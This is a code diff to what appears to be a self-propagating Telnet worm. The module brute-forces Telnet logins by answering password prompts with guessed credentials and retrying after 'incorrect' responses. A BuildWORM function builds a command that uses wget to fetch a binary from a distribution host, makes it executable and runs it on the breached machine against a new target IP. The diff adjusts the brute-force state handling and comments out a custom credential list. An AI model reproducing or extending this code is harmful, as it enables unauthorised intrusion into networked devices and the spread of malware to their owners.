@@ -63,6 +63,8 @@ Modules HACK_Telnet = {
     NULL, 0
 };
 
+
+/*
 // custom = after w finnish the static list.. custom can be loaded
 // over network, etc
 typedef struct _custom_credentials {
@@ -72,7 +74,7 @@ typedef struct _custom_credentials {
 
 CustomCredentials *custom_users = NULL;
 CustomCredentials *custom_passwords = NULL;
-
+*/
 
 // customstate goes in connection->buf (for keeping track of brute force, etc)
 typedef struct _custom_state {
@@ -167,6 +169,8 @@ int str_replace_one(char **str, char *macro, char *replace) {
     
     if ((sptr = strcasestr(*str, macro)) == NULL)
         return 0;
+        
+    // calculate sizes on each side of the macro we're replacing (before and after)'
     p1_size = (int)(sptr - *str);
     sptr += strlen(macro);
     p2_size = strlen(*str) - (sptr - *str);
@@ -195,6 +199,7 @@ void str_replace(char **str, char *macro, char *replace) {
         r = str_replace_one(str, macro, replace);
     } while (r > 0);
 }
+
 // we have to pass the connection its own IP.. it can be used for when it penetrates a new target (at least on this execution)
 char *BuildWORM(Modules *mptr, Connection *cptr, int *size) {
     char cmdline[] = "wget http://%DIST%/%FNAME%;chmod +x %FNAME%;./%FNAME% %DSTIP%\r\n";
@@ -233,7 +238,7 @@ typedef struct _state_commands {
     // look for password request..
     { STATE_TELNET_PASSWORD, "assword:", &BuildPassword, STATE_TELNET_FINDSHELL, NULL },
     // incorrect goes back to state new. so we can attempt another..
-    { STATE_TELNET_PASSWORD, "incorrect", &Incorrect, STATE_TELNET_NEW, NULL },
+    { STATE_TELNET_PASSWORD, "incorrect", &Incorrect, TCP_CONNECTED, NULL },
     // look for a string specifying its connected
     { STATE_TELNET_FINDSHELL, "last login", &BuildVerify, STATE_TELNET_INSIDE, NULL },
     
